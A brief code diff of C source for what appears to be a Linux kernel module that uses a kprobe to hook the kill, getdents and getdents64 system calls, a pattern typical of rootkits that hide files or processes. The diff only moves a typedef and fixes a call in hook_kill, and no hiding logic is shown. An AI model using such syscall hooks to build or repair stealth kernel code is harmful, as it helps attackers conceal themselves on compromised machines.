@@ -51,10 +51,10 @@ static struct kprobe kp = {
 
 #if defined(CONFIG_X86_64) && (LINUX_VERSION_CODE >= KERNEL_VERSION(4,17,0))
 #define PTREGS_SYSCALL_STUBS 1
-typedef asmlinkage long(*ptregs_t)(const struct pt_regs *regs);
 #endif
 
 #ifdef PTREGS_SYSCALL_STUBS
+typedef asmlinkage long(*ptregs_t)(const struct pt_regs *regs);
 static ptregs_t orig_kill;
 static asmlinkage long (*orig_getdents64)(const struct pt_regs *);
 static asmlinkage long (*orig_getdents)(const struct pt_regs *);
@@ -292,7 +292,7 @@ int hook_kill(pid_t pid, int sig)
 		return(0);
 	}
 
-    return orig_kill(regs);
+    return orig_kill(pid, sig);
 }
 #endif
 
